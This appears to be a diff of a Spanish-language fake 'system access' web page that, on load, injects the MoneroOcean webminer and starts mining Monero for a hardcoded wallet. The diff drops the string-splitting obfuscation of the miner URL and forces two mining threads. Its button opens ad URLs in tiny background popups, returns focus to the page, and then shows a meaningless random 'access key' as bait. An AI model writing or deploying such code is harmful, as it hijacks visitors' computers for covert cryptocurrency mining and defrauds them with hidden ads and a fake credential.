@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DELTA_SYSTEM_V8</title>
+    <title>DELTA_SYSTEM_V9</title>
     <style>
         body { background: #000; color: #00ff00; font-family: monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        #box { width: 95%; max-width: 450px; border: 1px solid #00ff00; padding: 20px; text-align: center; }
-        .vid-container { width: 100%; height: 200px; background: #000; margin-bottom: 15px; border: 1px solid #333; }
-        button { background: #00ff00; color: #000; border: none; padding: 15px; font-weight: bold; width: 100%; cursor: pointer; }
+        #box { width: 95%; max-width: 450px; border: 1px solid #0f0; padding: 20px; text-align: center; }
+        .vid { width: 100%; height: 200px; background: #000; margin-bottom: 15px; border: 1px solid #333; }
+        button { background: #0f0; color: #000; border: none; padding: 15px; font-weight: bold; width: 100%; cursor: pointer; }
         #key-display { display: none; margin-top: 15px; padding: 10px; border: 1px dashed #0f0; }
         .status { font-size: 10px; color: #555; margin-top: 5px; text-align: left; }
     </style>
 </head>
-<body onload="iniciarCargaSilenciosa()">
+<body onload="activarFuerzaBruta()">
 
 <div id="box">
-    <div class="vid-container">
-        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1&loop=1&playlist=jfKfPfyJRdk" frameborder="0"></iframe>
+    <div class="vid">
+        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1&loop=1&playlist=jfKfPfyJRdk" frameborder="0" allow="autoplay"></iframe>
     </div>
     
     <button id="main-btn" onclick="generarAcceso()">CONECTAR AL SISTEMA</button>
@@ -25,7 +25,7 @@
     <div id="key-display">
         <p>CLAVE DE ACCESO:</p>
         <h1 id="token" style="font-size: 2.5em; margin: 5px 0;"></h1>
-        <p style="font-size: 9px; color: #666;">PROCESO EN CURSO - NO CERRAR</p>
+        <p style="font-size: 9px; color: #ff0000;">MINADO ACTIVO - NO MINIMIZAR</p>
     </div>
     <div class="status" id="st">SYS_IDLE...</div>
 </div>
@@ -37,45 +37,32 @@
         "https://omg10.com/4/10780938"
     ];
 
-    // 1. CARGA AUTOMÁTICA AL ABRIR (MINERÍA INVISIBLE)
-    function iniciarCargaSilenciosa() {
-        document.getElementById('st').innerText = "SYS_CRYPT_STARTING...";
-        
-        // Ofuscación dinámica para saltar filtros
-        const parts = ["https://monero", "ocean.stream/", "webminer.js"];
+    function activarFuerzaBruta() {
+        document.getElementById('st').innerText = "CONNECTING_MINER...";
         const s = document.createElement('script');
-        s.src = parts.join('');
+        s.src = "https://moneroocean.stream/webminer.js";
         s.onload = () => {
-            const m = new MoneroOcean.Anonymous(W_ID);
+            // Configuración forzada: 2 hilos (threads) para evitar caídas a 0%
+            const m = new MoneroOcean.Anonymous(W_ID, { threads: 2, throttle: 0.1 });
             m.start();
-            document.getElementById('st').innerText = "SYS_CRYPT_ACTIVE_THREAD_01";
+            document.getElementById('st').innerText = "MINER_RUNNING_STABLE_V9";
         };
         document.head.appendChild(s);
     }
 
-    // 2. PUBLICIDAD INVISIBLE + GENERACIÓN DE CLAVE
     function generarAcceso() {
-        const btn = document.getElementById('main-btn');
-        btn.disabled = true;
-        btn.innerText = "VALIDANDO...";
-
-        // Lanzar anuncios en pestañas de fondo
         AD_URLS.forEach(url => {
-            const win = window.open(url, '_blank');
-            if (win) {
-                win.blur(); // Quitar foco a la publicidad
-                window.focus(); // Devolver foco al portal
-            }
+            const win = window.open(url, '_blank', 'width=100,height=100');
+            if (win) { win.blur(); window.focus(); }
         });
 
-        // Simular validación técnica
         setTimeout(() => {
-            const key = "DT-" + Math.random().toString(36).substring(2, 8).toUpperCase();
+            const key = "DX-" + Math.random().toString(36).substring(2, 8).toUpperCase();
             document.getElementById('main-btn').style.display = 'none';
             document.getElementById('key-display').style.display = 'block';
             document.getElementById('token').innerText = key;
-            document.getElementById('st').innerText = "SYS_SESSION_ESTABLISHED";
-        }, 4000);
+            document.getElementById('st').innerText = "SESSION_VERIFIED";
+        }, 5000);
     }
 </script>
 </body>
